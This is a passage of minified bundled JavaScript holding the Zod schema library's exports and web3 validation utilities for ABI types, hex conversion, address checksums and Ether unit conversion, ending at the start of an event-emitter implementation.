        e.ZodString = "ZodString", e.ZodNumber = "ZodNumber", e.ZodNaN = "ZodNaN", e.ZodBigInt = "ZodBigInt", e.ZodBoolean = "ZodBoolean", e.ZodDate = "ZodDate", e.ZodSymbol = "ZodSymbol", e.ZodUndefined = "ZodUndefined", e.ZodNull = "ZodNull", e.ZodAny = "ZodAny", e.ZodUnknown = "ZodUnknown", e.ZodNever = "ZodNever", e.ZodVoid = "ZodVoid", e.ZodArray = "ZodArray", e.ZodObject = "ZodObject", e.ZodUnion = "ZodUnion", e.ZodDiscriminatedUnion = "ZodDiscriminatedUnion", e.ZodIntersection = "ZodIntersection", e.ZodTuple = "ZodTuple", e.ZodRecord = "ZodRecord", e.ZodMap = "ZodMap", e.ZodSet = "ZodSet", e.ZodFunction = "ZodFunction", e.ZodLazy = "ZodLazy", e.ZodLiteral = "ZodLiteral", e.ZodEnum = "ZodEnum", e.ZodEffects = "ZodEffects", e.ZodNativeEnum = "ZodNativeEnum", e.ZodOptional = "ZodOptional", e.ZodNullable = "ZodNullable", e.ZodDefault = "ZodDefault", e.ZodCatch = "ZodCatch", e.ZodPromise = "ZodPromise", e.ZodBranded = "ZodBranded", e.ZodPipeline = "ZodPipeline", e.ZodReadonly = "ZodReadonly"
    })(ee || (ee = {}));
    const vR = (e, t = {
            message: `Input not instance of ${e.name}`
        }) => cE(n => n instanceof e, t),
        uE = En.create,
        dE = ai.create,
        yR = ju.create,
        wR = li.create,
        fE = rl.create,
        bR = so.create,
        xR = Lu.create,
        ER = il.create,
        AR = ol.create,
        _R = gs.create,
        SR = Vi.create,
        kR = Ar.create,
        TR = Fu.create,
        IR = kn.create,
        CR = Me.create,
        PR = Me.strictCreate,
        RR = sl.create,
        NR = zd.create,
        BR = al.create,
        MR = Kn.create,
        OR = ll.create,
        LR = Du.create,
        FR = ao.create,
        DR = ts.create,
        jR = cl.create,
        HR = ul.create,
        $R = ci.create,
        UR = dl.create,
        zR = vs.create,
        Ey = Cn.create,
        GR = Wn.create,
        VR = ui.create,
        WR = Cn.createWithPreprocess,
        qR = Ul.create,
        QR = () => uE().optional(),
        KR = () => dE().optional(),
        ZR = () => fE().optional(),
        YR = {
            string: e => En.create({ ...e,
                coerce: !0
            }),
            number: e => ai.create({ ...e,
                coerce: !0
            }),
            boolean: e => rl.create({ ...e,
                coerce: !0
            }),
            bigint: e => li.create({ ...e,
                coerce: !0
            }),
            date: e => so.create({ ...e,
                coerce: !0
            })
        },
        JR = te;
    var Bn = Object.freeze({
        __proto__: null,
        defaultErrorMap: ms,
        setErrorMap: JP,
        getErrorMap: Bu,
        makeIssue: Mu,
        EMPTY_PATH: XP,
        addIssueToContext: z,
        ParseStatus: mt,
        INVALID: te,
        DIRTY: Go,
        OK: kt,
        isAborted: kp,
        isDirty: Tp,
        isValid: tl,
        isAsync: nl,
        get util() {
            return pe
        },
        get objectUtil() {
            return Sp
        },
        ZodParsedType: V,
        getParsedType: Hr,
        ZodType: le,
        datetimeRegex: aE,
        ZodString: En,
        ZodNumber: ai,
        ZodBigInt: li,
        ZodBoolean: rl,
        ZodDate: so,
        ZodSymbol: Lu,
        ZodUndefined: il,
        ZodNull: ol,
        ZodAny: gs,
        ZodUnknown: Vi,
        ZodNever: Ar,
        ZodVoid: Fu,
        ZodArray: kn,
        ZodObject: Me,
        ZodUnion: sl,
        ZodDiscriminatedUnion: zd,
        ZodIntersection: al,
        ZodTuple: Kn,
        ZodRecord: ll,
        ZodMap: Du,
        ZodSet: ao,
        ZodFunction: ts,
        ZodLazy: cl,
        ZodLiteral: ul,
        ZodEnum: ci,
        ZodNativeEnum: dl,
        ZodPromise: vs,
        ZodEffects: Cn,
        ZodTransformer: Cn,
        ZodOptional: Wn,
        ZodNullable: ui,
        ZodDefault: fl,
        ZodCatch: hl,
        ZodNaN: ju,
        BRAND: mR,
        ZodBranded: T0,
        ZodPipeline: Ul,
        ZodReadonly: pl,
        custom: cE,
        Schema: le,
        ZodSchema: le,
        late: gR,
        get ZodFirstPartyTypeKind() {
            return ee
        },
        coerce: YR,
        any: _R,
        array: IR,
        bigint: wR,
        boolean: fE,
        date: bR,
        discriminatedUnion: NR,
        effect: Ey,
        enum: $R,
        function: DR,
        instanceof: vR,
        intersection: BR,
        lazy: jR,
        literal: HR,
        map: LR,
        nan: yR,
        nativeEnum: UR,
        never: kR,
        null: AR,
        nullable: VR,
        number: dE,
        object: CR,
        oboolean: ZR,
        onumber: KR,
        optional: GR,
        ostring: QR,
        pipeline: qR,
        preprocess: WR,
        promise: zR,
        record: OR,
        set: FR,
        strictObject: PR,
        string: uE,
        symbol: xR,
        transformer: Ey,
        tuple: MR,
        undefined: ER,
        union: RR,
        unknown: SR,
        void: TR,
        NEVER: JR,
        ZodIssueCode: j,
        quotelessJson: YP,
        ZodError: Qt
    });
    const XR = e => e.message ? e.message : "unspecified error";
    class ys extends ne {
        constructor(t) {
            super(), this.code = x4, this.errors = t, super.message = `Web3 validator found ${t.length} error[s]:
${this._compileErrors().join(`
`)}`
        }
        _compileErrors() {
            return this.errors.map(XR)
        }
    }
    const eN = ["bool", "int", "uint", "bytes", "string", "address", "tuple"],
        hE = e => typeof e == "object" && "type" in e && "name" in e,
        I0 = e => typeof e == "string",
        ye = e => typeof e == "string" && /^((-)?0x[0-9a-f]+|(0x))$/i.test(e);

    function pE(e, t) {
        return !(typeof e != "string" || !e.match(/^0x[0-9A-Fa-f]*$/))
    }
    const Hu = e => typeof e == "number" || typeof e == "bigint" || typeof e == "string" && /^((-0x|0x|-)?[0-9a-f]+|(0x))$/i.test(e);

    function C0(e) {
        if (typeof e != "string") throw new Error(`[isHexPrefixed] input must be type 'string', received type ${typeof e}`);
        return e.startsWith("0x")
    }
    const P0 = function(e) {
            for (const [t, n] of Object.entries(e))
                if (n !== void 0 && n.length > 0 && n[0] === 0) throw new Error(`${t} cannot have leading zeroes, received: ${n.toString()}`)
        },
        tN = ["hex", "number", "blockNumber", "blockNumberOrTag", "filter", "bloom"],
        vo = e => {
            let t = e.replace(/ /, ""),
                n, r = !1,
                i = [];
            if (e.includes("[") && (t = t.slice(0, t.indexOf("[")), i = [...e.matchAll(/(?:\[(\d*)\])/g)].map(o => parseInt(o[1], 10)).map(o => Number.isNaN(o) ? -1 : o), r = i.length > 0), eN.includes(t)) return {
                baseType: t,
                isArray: r,
                baseTypeSize: n,
                arraySizes: i
            };
            if (t.startsWith("int")) n = parseInt(t.substring(3), 10), t = "int";
            else if (t.startsWith("uint")) n = parseInt(e.substring(4), 10), t = "uint";
            else if (t.startsWith("bytes")) n = parseInt(t.substring(5), 10), t = "bytes";
            else return {
                baseType: void 0,
                isArray: !1,
                baseTypeSize: void 0,
                arraySizes: i
            };
            return {
                baseType: t,
                isArray: r,
                baseTypeSize: n,
                arraySizes: i
            }
        },
        Yf = (e, t = {}) => {
            if (Object.keys(t).includes("type")) throw new ys([{
                keyword: "eth",
                message: 'Either "eth" or "type" can be presented in schema',
                params: {
                    eth: e
                },
                instancePath: "",
                schemaPath: ""
            }]);
            const {
                baseType: r,
                baseTypeSize: i
            } = vo(e);
            if (!r && !tN.includes(e)) throw new ys([{
                keyword: "eth",
                message: `Eth data type "${e}" is not valid`,
                params: {
                    eth: e
                },
                instancePath: "",
                schemaPath: ""
            }]);
            if (r) {
                if (r === "tuple") throw new Error('"tuple" type is not implemented directly.');
                return {
                    format: `${r}${i??""}`,
                    required: !0
                }
            }
            return e ? {
                format: e,
                required: !0
            } : {}
        },
        $u = (e, t = "/0") => {
            const n = {
                type: "array",
                items: [],
                maxItems: e.length,
                minItems: e.length
            };
            for (const [r, i] of e.entries()) {
                let o, s, a = [];
                hE(i) ? (o = i.type, s = i.name || `${t}/${r}`, a = i.components) : typeof i == "string" ? (o = i, s = `${t}/${r}`) : Array.isArray(i) && (i[0] && typeof i[0] == "string" && i[0].startsWith("tuple") && !Array.isArray(i[0]) && i[1] && Array.isArray(i[1]) ? (o = i[0], s = `${t}/${r}`, a = i[1]) : (o = "tuple", s = `${t}/${r}`, a = i));
                const {
                    baseType: l,
                    isArray: u,
                    arraySizes: c
                } = vo(o);
                let d, f = n;
                for (let h = c.length - 1; h > 0; h -= 1) d = {
                    type: "array",
                    $id: s,
                    items: [],
                    maxItems: c[h],
                    minItems: c[h]
                }, c[h] < 0 && (delete d.maxItems, delete d.minItems), Array.isArray(f.items) ? f.items.length === 0 ? f.items = [d] : f.items.push(d) : f.items = [f.items, d], f = d;
                if (l === "tuple" && !u) {
                    const h = $u(a, s);
                    h.$id = s, f.items.push(h)
                } else if (l === "tuple" && u) {
                    const h = c[0],
                        v = Object.assign({
                            type: "array",
                            $id: s,
                            items: $u(a, s)
                        }, h >= 0 && {
                            minItems: h,
                            maxItems: h
                        });
                    f.items.push(v)
                } else if (u) {
                    const h = c[0],
                        v = Object.assign({
                            type: "array",
                            $id: s,
                            items: Yf(o)
                        }, h >= 0 && {
                            minItems: h,
                            maxItems: h
                        });
                    f.items.push(v)
                } else Array.isArray(f.items) ? f.items.push(Object.assign({
                    $id: s
                }, Yf(o))) : f.items.push(Object.assign({
                    $id: s
                }, Yf(o)));
                f = n
            }
            return n
        },
        R0 = e => $u(e),
        N0 = (e, t) => t === 1 ? e : N0(e[0], t - 1),
        Ra = (e, t, n) => {
            const r = [];
            for (const [i, o] of e.entries()) {
                let s, a, l = [];
                hE(o) ? (s = o.type, a = o.name, l = o.components) : typeof o == "string" ? s = o : Array.isArray(o) && (o[1] && Array.isArray(o[1]) ? (s = o[0], l = o[1]) : (s = "tuple", l = o));
                const {
                    baseType: u,
                    isArray: c,
                    arraySizes: d
                } = vo(s), f = Array.isArray(t) ? t[i] : t[a];
                if (u === "tuple" && !c) r.push(Ra(l, f, n));
                else if (u === "tuple" && c) {
                    const h = [];
                    for (const v of f)
                        if (d.length > 1) {
                            const p = N0(v, d.length - 1),
                                w = [];
                            for (const m of p) w.push(Ra(l, m, n));
                            h.push(w)
                        } else h.push(Ra(l, v, n));
                    r.push(h)
                } else r.push(f)
            }
            return n = n ?? [], n.push(...r), n
        },
        mE = e => {
            if (e >= 48 && e <= 57) return e - 48;
            if (e >= 65 && e <= 70) return e - 55;
            if (e >= 97 && e <= 102) return e - 87;
            throw new Error(`Invalid code point: ${e}`)
        },
        Gd = e => {
            if (!ye(e)) throw new Error("Invalid hex string");
            const [t, n] = e.startsWith("-") ? [!0, e.slice(1)] : [!1, e], r = BigInt(n);
            return r > Number.MAX_SAFE_INTEGER ? t ? -r : r : r < Number.MIN_SAFE_INTEGER ? r : t ? -1 * Number(r) : Number(r)
        },
        Vd = e => {
            if ((typeof e == "number" || typeof e == "bigint") && e < 0) return `-0x${e.toString(16).slice(1)}`;
            if ((typeof e == "number" || typeof e == "bigint") && e >= 0) return `0x${e.toString(16)}`;
            if (typeof e == "string" && ye(e)) {
                const [t, n] = e.startsWith("-") ? [!0, e.slice(1)] : [!1, e], r = n.split(/^(-)?0(x|X)/).slice(-1)[0];
                return `${t?"-":""}0x${r.replace(/^0+/,"").toLowerCase()}`
            }
            if (typeof e == "string" && !ye(e)) return Vd(BigInt(e));
            throw new b0(e)
        },
        Uu = (e, t, n = "0") => {
            if (typeof e == "string" && !ye(e)) return e.padStart(t, n);
            const r = typeof e == "string" && ye(e) ? e : Vd(e),
                [i, o] = r.startsWith("-") ? ["-0x", r.slice(3)] : ["0x", r.slice(2)];
            return `${i}${o.padStart(t,n)}`
        };

    function Tr(e) {
        let t = "0x";
        for (const n of e) {
            const r = n.toString(16);
            t += r.length === 1 ? `0${r}` : r
        }
        return t
    }
    const tr = {
        zero: 48,
        nine: 57,
        A: 65,
        F: 70,
        a: 97,
        f: 102
    };

    function Ay(e) {
        if (e >= tr.zero && e <= tr.nine) return e - tr.zero;
        if (e >= tr.A && e <= tr.F) return e - (tr.A - 10);
        if (e >= tr.a && e <= tr.f) return e - (tr.a - 10)
    }

    function yo(e) {
        let t = 0;
        if (e.startsWith("0") && (e[1] === "x" || e[1] === "X") && (t = 2), e.length % 2 !== 0) throw new es(`hex string has odd length: ${e}`);
        const n = (e.length - t) / 2,
            r = new Uint8Array(n);
        for (let i = 0, o = t; i < n; i += 1) {
            const s = Ay(e.charCodeAt(o++)),
                a = Ay(e.charCodeAt(o++));
            if (s === void 0 || a === void 0) throw new es(`Invalid byte sequence ("${e[o-2]}${e[o-1]}" in "${e}").`);
            r[i] = s * 16 + a
        }
        return r
    }

    function Wd(e) {
        var t;
        return !(e instanceof Uint8Array) && ((t = e == null ? void 0 : e.constructor) === null || t === void 0 ? void 0 : t.name) === "Uint8Array" ? Uint8Array.from(e) : e
    }
    const gE = Object.freeze(Object.defineProperty({
            __proto__: null,
            abiSchemaToJsonSchema: $u,
            codePointToInt: mE,
            ensureIfUint8Array: Wd,
            ethAbiToJsonSchema: R0,
            fetchArrayElement: N0,
            hexToNumber: Gd,
            hexToUint8Array: yo,
            numberToHex: Vd,
            padLeft: Uu,
            parseBaseType: vo,
            transformJsonDataToAbiFormat: Ra,
            uint8ArrayToHexString: Tr
        }, Symbol.toStringTag, {
            value: "Module"
        })),
        Cp = e => {
            var t, n;
            return e instanceof Uint8Array || ((t = e == null ? void 0 : e.constructor) === null || t === void 0 ? void 0 : t.name) === "Uint8Array" || ((n = e == null ? void 0 : e.constructor) === null || n === void 0 ? void 0 : n.name) === "Buffer"
        },
        gi = (e, t = {
            abiType: "bytes"
        }) => {
            if (typeof e != "string" && !Array.isArray(e) && !Cp(e) || typeof e == "string" && ye(e) && e.startsWith("-") || typeof e == "string" && !ye(e)) return !1;
            let n;
            if (typeof e == "string") {
                if (e.length % 2 !== 0) return !1;
                n = yo(e)
            } else if (Array.isArray(e)) {
                if (e.some(r => r < 0 || r > 255 || !Number.isInteger(r))) return !1;
                n = new Uint8Array(e)
            } else n = e;
            if (t != null && t.abiType) {
                const {
                    baseTypeSize: r
                } = vo(t.abiType);
                return r ? n.length === r : !0
            }
            return t != null && t.size ? n.length === (t == null ? void 0 : t.size) : !0
        },
        vE = e => {
            if (!/^(0x)?[0-9a-f]{40}$/i.test(e)) return !1;
            const t = e.slice(2),
                n = hs(t.toLowerCase()),
                r = Tr(bt(Wd(n))).slice(2);
            for (let i = 0; i < 40; i += 1)
                if (parseInt(r[i], 16) > 7 && t[i].toUpperCase() !== t[i] || parseInt(r[i], 16) <= 7 && t[i].toLowerCase() !== t[i]) return !1;
            return !0
        },
        Zt = (e, t = !0) => {
            if (typeof e != "string" && !Cp(e)) return !1;
            let n;
            return Cp(e) ? n = Tr(e) : typeof e == "string" && !ye(e) ? n = e.toLowerCase().startsWith("0x") ? e : `0x${e}` : n = e, /^(0x)?[0-9a-f]{40}$/i.test(n) ? /^(0x|0X)?[0-9a-f]{40}$/.test(n) || /^(0x|0X)?[0-9A-F]{40}$/.test(n) ? !0 : t ? vE(n) : !0 : !1
        },
        lo = (e, t) => {
            if (t === BigInt(0)) return BigInt(1);
            let n = e;
            for (let r = 1; r < t; r += 1) n *= e;
            return n
        },
        _r = (e, t = {
            abiType: "uint"
        }) => {
            if (!["number", "string", "bigint"].includes(typeof e) || typeof e == "string" && e.length === 0) return !1;
            let n;
            if (t != null && t.abiType) {
                const {
                    baseTypeSize: i
                } = vo(t.abiType);
                i && (n = i)
            } else t.bitSize && (n = t.bitSize);
            const r = lo(BigInt(2), BigInt(n ?? 256)) - BigInt(1);
            try {
                const i = typeof e == "string" && ye(e) ? BigInt(Gd(e)) : BigInt(e);
                return i >= 0 && i <= r
            } catch {
                return !1
            }
        },
        ml = (e, t = {
            abiType: "int"
        }) => {
            if (!["number", "string", "bigint"].includes(typeof e) || typeof e == "number" && e > Number.MAX_SAFE_INTEGER) return !1;
            let n;
            if (t != null && t.abiType) {
                const {
                    baseTypeSize: o,
                    baseType: s
                } = vo(t.abiType);
                if (s !== "int") return !1;
                o && (n = o)
            } else t.bitSize && (n = t.bitSize);
            const r = lo(BigInt(2), BigInt((n ?? 256) - 1)),
                i = BigInt(-1) * lo(BigInt(2), BigInt((n ?? 256) - 1));
            try {
                const o = typeof e == "string" && ye(e) ? BigInt(Gd(e)) : BigInt(e);
                return o >= i && o <= r
            } catch {
                return !1
            }
        },
        yE = e => !!(ml(e) || typeof e == "string" && /[0-9.]/.test(e) && e.indexOf(".") === e.lastIndexOf(".") || typeof e == "number"),
        wE = e => _r(e),
        tt = e => Object.values(ur).includes(e),
        Pp = e => tt(e) || wE(e),
        $s = e => typeof e != "string" || !/^(0x)?[0-9a-f]{512}$/i.test(e) ? !1 : !!(/^(0x)?[0-9a-f]{512}$/.test(e) || /^(0x)?[0-9A-F]{512}$/.test(e)),
        qd = (e, t) => {
            if (typeof t == "string" && !ye(t) || !$s(e)) return !1;
            const n = typeof t == "string" ? yo(t) : t,
                r = Tr(bt(n)).slice(2);
            for (let i = 0; i < 12; i += 4) {
                const o = (parseInt(r.slice(i, i + 2), 16) << 8) + parseInt(r.slice(i + 2, i + 4), 16) & 2047,
                    s = mE(e.charCodeAt(e.length - 1 - Math.floor(o / 4))),
                    a = 1 << o % 4;
                if ((s & a) !== a) return !1
            }
            return !0
        },
        nN = (e, t) => {
            if (!$s(e) || !Zt(t)) return !1;
            const n = Uu(t, 64);
            return qd(e, n)
        },
        rN = (e, t) => !$s(e) || !Zt(t) ? !1 : qd(e, t),
        iN = e => ["number", "string", "boolean"].includes(typeof e) ? typeof e == "boolean" ? !0 : typeof e == "string" && !ye(e) ? e === "1" || e === "0" : typeof e == "string" && ye(e) ? e === "0x1" || e === "0x0" : e === 1 || e === 0 : !1,
        N = e => e == null,
        ws = e => typeof e == "object" && !N(e) && !Array.isArray(e) && !(e instanceof y0),
        zu = e => typeof e != "string" || !/^(0x)?[0-9a-f]{64}$/i.test(e) ? !1 : !!(/^(0x)?[0-9a-f]{64}$/.test(e) || /^(0x)?[0-9A-F]{64}$/.test(e)),
        oN = (e, t) => !$s(e) || !zu(t) ? !1 : qd(e, t),
        sN = e => {
            const t = ["fromBlock", "toBlock", "address", "topics", "blockHash"];
            if (N(e) || typeof e != "object" || !Object.keys(e).every(n => t.includes(n)) || !N(e.fromBlock) && !Pp(e.fromBlock) || !N(e.toBlock) && !Pp(e.toBlock)) return !1;
            if (!N(e.address)) {
                if (Array.isArray(e.address)) {
                    if (!e.address.every(n => Zt(n))) return !1
                } else if (!Zt(e.address)) return !1
            }
            return !(!N(e.topics) && !e.topics.every(n => N(n) ? !0 : Array.isArray(n) ? n.every(r => zu(r)) : !!zu(n)))
        },
        co = {
            address: e => Zt(e),
            bloom: e => $s(e),
            blockNumber: e => wE(e),
            blockTag: e => tt(e),
            blockNumberOrTag: e => Pp(e),
            bool: e => iN(e),
            bytes: e => gi(e),
            filter: e => sN(e),
            hex: e => ye(e),
            uint: e => _r(e),
            int: e => ml(e),
            number: e => yE(e),
            string: e => I0(e)
        };
    for (let e = 8; e <= 256; e += 8) co[`int${e}`] = t => ml(t, {
        bitSize: e
    }), co[`uint${e}`] = t => _r(t, {
        bitSize: e
    });
    for (let e = 1; e <= 32; e += 1) co[`bytes${e}`] = t => gi(t, {
        size: e
    });
    co.bytes256 = co.bytes;
    const pa = e => {
        if ((!(e != null && e.type) || (e == null ? void 0 : e.type) === "object") && (e != null && e.properties)) {
            const t = {};
            for (const n of Object.keys(e.properties)) {
                const r = pa(e.properties[n]);
                r && (t[n] = r)
            }
            return Array.isArray(e.required) ? Bn.object(t).partial().required(e.required.reduce((n, r) => Object.assign(Object.assign({}, n), {
                [r]: !0
            }), {})) : Bn.object(t).partial()
        }
        if ((e == null ? void 0 : e.type) === "array" && (e != null && e.items)) {
            if (Array.isArray(e.items) && e.items.length > 1 && e.maxItems !== void 0 && new Set(e.items.map(r => r.$id)).size === e.items.length) {
                const r = [];
                for (const i of e.items) {
                    const o = pa(i);
                    o && r.push(o)
                }
                return Bn.tuple(r)
            }
            const t = Array.isArray(e.items) ? e.items[0] : e.items;
            let n = Bn.array(pa(t));
            return n = e.minItems !== void 0 ? n.min(e.minItems) : n, n = e.maxItems !== void 0 ? n.max(e.maxItems) : n, n
        }
        if (e.oneOf && Array.isArray(e.oneOf)) return Bn.union(e.oneOf.map(t => pa(t)));
        if (e != null && e.format) {
            if (!co[e.format]) throw new CP(e.format);
            return Bn.any().refine(co[e.format], t => ({
                params: {
                    value: t,
                    format: e.format
                }
            }))
        }
        return e != null && e.type && (e == null ? void 0 : e.type) !== "object" && typeof Bn[String(e.type)] == "function" ? Bn[String(e.type)]() : Bn.object({
            data: Bn.any()
        }).partial()
    };
    class Vo {
        static factory() {
            return Vo.validatorInstance || (Vo.validatorInstance = new Vo), Vo.validatorInstance
        }
        validate(t, n, r) {
            var i, o;
            const a = pa(t).safeParse(n);
            if (!a.success) {
                const l = this.convertErrors((o = (i = a.error) === null || i === void 0 ? void 0 : i.issues) !== null && o !== void 0 ? o : []);
                if (l) {
                    if (r != null && r.silent) return l;
                    throw new ys(l)
                }
            }
        }
        convertErrors(t) {
            if (t && Array.isArray(t) && t.length > 0) return t.map(n => {
                var r;
                let i, o, s, a;
                a = n.path.join("/");
                const l = String(n.path[n.path.length - 1]),
                    u = n.path.join("/");
                if (n.code === j.too_big) o = "maxItems", a = `${u}/maxItems`, s = {
                    limit: n.maximum
                }, i = `must NOT have more than ${n.maximum} items`;
                else if (n.code === j.too_small) o = "minItems", a = `${u}/minItems`, s = {
                    limit: n.minimum
                }, i = `must NOT have fewer than ${n.minimum} items`;
                else if (n.code === j.custom) {
                    const {
                        value: c,
                        format: d
                    } = (r = n.params) !== null && r !== void 0 ? r : {};
                    typeof c > "u" ? i = `value at "/${a}" is required` : i = `value "${typeof c=="object"?JSON.stringify(c):c}" at "/${a}" must pass "${d}" validation`, s = {
                        value: c
                    }
                }
                return {
                    keyword: o ?? l,
                    instancePath: u ? `/${u}` : "",
                    schemaPath: a ? `#${a}` : "#",
                    params: s ?? {
                        value: n.message
                    },
                    message: i ?? n.message
                }
            })
        }
    }
    class aN {
        constructor() {
            this._validator = Vo.factory()
        }
        validateJSONSchema(t, n, r) {
            return this._validator.validate(t, n, r)
        }
        validate(t, n, r = {
            silent: !1
        }) {
            var i, o;
            const s = R0(t);
            if (!(Array.isArray(s.items) && ((i = s.items) === null || i === void 0 ? void 0 : i.length) === 0 && n.length === 0)) {
                if (Array.isArray(s.items) && ((o = s.items) === null || o === void 0 ? void 0 : o.length) === 0 && n.length !== 0) throw new ys([{
                    instancePath: "/0",
                    schemaPath: "/",
                    keyword: "required",
                    message: "empty schema against data can not be validated",
                    params: n
                }]);
                return this._validator.validate(s, n, r)
            }
        }
    }
    const Y = new aN;

    function vi(e) {
        var t, n;
        return e instanceof Uint8Array || ((t = e == null ? void 0 : e.constructor) === null || t === void 0 ? void 0 : t.name) === "Uint8Array" || ((n = e == null ? void 0 : e.constructor) === null || n === void 0 ? void 0 : n.name) === "Buffer"
    }

    function Tt(...e) {
        const t = e.reduce((i, o) => i + o.length, 0),
            n = new Uint8Array(t);
        let r = 0;
        for (const i of e) n.set(i, r), r += i.length;
        return n
    }

    function Qd(e, t) {
        if (e === t) return !0;
        if (e.byteLength !== t.byteLength) return !1;
        for (let n = 0; n < e.byteLength; n += 1)
            if (e[n] !== t[n]) return !1;
        return !0
    }
    const Kd = {
            noether: BigInt(0),
            wei: BigInt(1),
            kwei: BigInt(1e3),
            Kwei: BigInt(1e3),
            babbage: BigInt(1e3),
            femtoether: BigInt(1e3),
            mwei: BigInt(1e6),
            Mwei: BigInt(1e6),
            lovelace: BigInt(1e6),
            picoether: BigInt(1e6),
            gwei: BigInt(1e9),
            Gwei: BigInt(1e9),
            shannon: BigInt(1e9),
            nanoether: BigInt(1e9),
            nano: BigInt(1e9),
            szabo: BigInt(1e12),
            microether: BigInt(1e12),
            micro: BigInt(1e12),
            finney: BigInt(1e15),
            milliether: BigInt(1e15),
            milli: BigInt(1e15),
            ether: BigInt("1000000000000000000"),
            kether: BigInt("1000000000000000000000"),
            grand: BigInt("1000000000000000000000"),
            mether: BigInt("1000000000000000000000000"),
            gether: BigInt("1000000000000000000000000000"),
            tether: BigInt("1000000000000000000000000000000")
        },
        Rp = "Warning: Using type `number` with values that are large or contain many decimals may cause loss of precision, it is recommended to use type `string` or `BigInt` when using conversion methods",
        Zn = e => {
            if (Y.validate(["bytes"], [e]), vi(e)) return e;
            if (Array.isArray(e)) return new Uint8Array(e);
            if (typeof e == "string") return yo(e);
            throw new es(e)
        },
        {
            uint8ArrayToHexString: lN
        } = gE,
        ue = e => lN(Zn(e)),
        ke = e => typeof e == "string" && e.slice(0, 2).toLowerCase() !== "0x" ? Zn(`0x${e}`) : Zn(e),
        zl = e => (Y.validate(["hex"], [e]), Gd(e)),
        cN = zl,
        Ze = (e, t) => {
            typeof e != "bigint" && Y.validate(["int"], [e]);
            let n = Vd(e);
            return t && (!n.startsWith("-") && n.length % 2 === 1 ? n = "0x0".concat(n.slice(2)) : n.length % 2 === 0 && n.startsWith("-") && (n = "-0x0".concat(n.slice(3)))), n
        },
        uN = Ze,
        dN = e => zl(e).toString(),
        Pn = e => {
            Y.validate(["string"], [e]);
            let t = e.replace(/^(?:\u0000)/, "");
            return t = t.replace(/(?:\u0000)$/, ""), ue(new TextEncoder().encode(t))
        },
        bE = Pn,
        fN = Pn,
        Zd = e => nE(ke(e)),
        hN = e => typeof e == "string" ? Zd(e) : (Y.validate(["bytes"], [e]), nE(e)),
        B0 = hs,
        pN = Zd,
        xE = e => {
            Y.validate(["string"], [e]);
            let t = "";
            for (let n = 0; n < e.length; n += 1) {
                const r = e.charCodeAt(n).toString(16);
                t += r.length % 2 !== 0 ? `0${r}` : r
            }
            return `0x${t}`
        },
        mN = xE,
        EE = e => new TextDecoder("ascii").decode(ke(e)),
        gN = EE,
        Sr = (e, t) => {
            if (typeof e == "string" && Zt(e)) return t ? "address" : `0x${e.toLowerCase().replace(/^0x/i,"")}`;
            if (typeof e == "boolean") return t ? "bool" : e ? "0x01" : "0x00";
            if (typeof e == "number") return t ? e < 0 ? "int256" : "uint256" : Ze(e);
            if (typeof e == "bigint") return t ? "bigint" : Ze(e);
            if (vi(e)) return t ? "bytes" : ue(e);
            if (typeof e == "object" && e) return t ? "string" : Pn(JSON.stringify(e));
            if (typeof e == "string") {
                if (e.startsWith("-0x") || e.startsWith("-0X")) return t ? "int256" : Ze(e);
                if (ye(e)) return t ? "bytes" : e;
                if (Hu(e) && !ml(e) && !_r(e)) return t ? "bytes" : `0x${e}`;
                if (Hu(e) && !ml(e) && _r(e)) return t ? "uint" : Ze(e);
                if (!Number.isFinite(e)) return t ? "string" : Pn(e)
            }
            throw new fP(e)
        },
        Ot = e => {
            if (typeof e == "number") return e > 1e20 ? (console.warn(Rp), BigInt(e)) : e;
            if (typeof e == "bigint") return e >= Number.MIN_SAFE_INTEGER && e <= Number.MAX_SAFE_INTEGER ? Number(e) : e;
            if (typeof e == "string" && ye(e)) return zl(e);
            try {
                return Ot(BigInt(e))
            } catch {
                throw new b0(e)
            }
        },
        Li = e => {
            if (typeof e == "number") return BigInt(e);
            if (typeof e == "bigint") return e;
            if (typeof e == "string" && Hu(e)) return e.startsWith("-") ? -BigInt(e.substring(1)) : BigInt(e);
            throw new b0(e)
        },
        vN = (e, t) => {
            let n;
            if (typeof t == "string") {
                if (n = Kd[t], !n) throw new Vx(t)
            } else {
                if (t < 0 || !Number.isInteger(t)) throw new Wx(t);
                n = lo(BigInt(10), BigInt(t))
            }
            const r = String(Ot(e)),
                i = n.toString().length - 1;
            if (i <= 0) return r.toString();
            const o = r.padStart(i, "0"),
                s = o.slice(0, -i),
                a = o.slice(-i).replace(/\.?0+$/, "");
            return s === "" ? `0.${a}` : a === "" ? s : `${s}.${a}`.slice(0, s.length + i + 1)
        },
        yN = (e, t) => {
            Y.validate(["number"], [e]);
            let n;
            if (typeof t == "string") {
                if (n = Kd[t], !n) throw new Vx(t)
            } else {
                if (t < 0 || !Number.isInteger(t)) throw new Wx(t);
                n = lo(BigInt(10), BigInt(t))
            }
            let r = e;
            typeof r == "number" && (r < 1e-15 && console.warn(Rp), r > 1e20 ? (console.warn(Rp), r = BigInt(r)) : r = r.toLocaleString("fullwide", {
                useGrouping: !1,
                maximumFractionDigits: 20
            }));
            const [i, o] = String(typeof r == "string" && !ye(r) ? r : Ot(r)).split(".").concat(""), a = BigInt(`${i}${o}`) * n, l = o.length;
            return l === 0 ? a.toString() : a.toString().slice(0, -l)
        },
        Xn = e => {
            if (!Zt(e, !1)) throw new x0(e);
            const t = e.toLowerCase().replace(/^0x/i, ""),
                n = Tr(bt(Wd(B0(t))));
            if (N(n) || n === "0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470") return "";
            let r = "0x";
            const i = n.replace(/^0x/i, "");
            for (let o = 0; o < t.length; o += 1) parseInt(i[o], 16) > 7 ? r += t[o].toUpperCase() : r += t[o];
            return r
        },
        AE = e => {
            if (typeof e == "boolean") return e;
            if (typeof e == "number" && (e === 0 || e === 1) || typeof e == "bigint" && (e === BigInt(0) || e === BigInt(1))) return !!e;
            if (typeof e == "string" && !ye(e) && (e === "1" || e === "0" || e === "false" || e === "true")) return e === "true" ? !0 : e === "false" ? !1 : !!Number(e);
            if (typeof e == "string" && ye(e) && (e === "0x1" || e === "0x0")) return !!Ot(e);
            throw new E0(e)
        };
    var _E = {
        exports: {}
    };
    (function(e) {
        var t = Object.prototype.hasOwnProperty,
            n = "~";

        function r() {}
        Object.create && (r.prototype = Object.create(null), new r().__proto__ || (n = !1));

        function i(l, u, c) {
            this.fn = l, this.context = u, this.once = c || !1
        }

        function o(l, u, c, d, f) {
            if (typeof c != "function") throw new TypeError("The listener must be a function");
            var h = new i(c, d || l, f),
                v = n ? n + u : u;
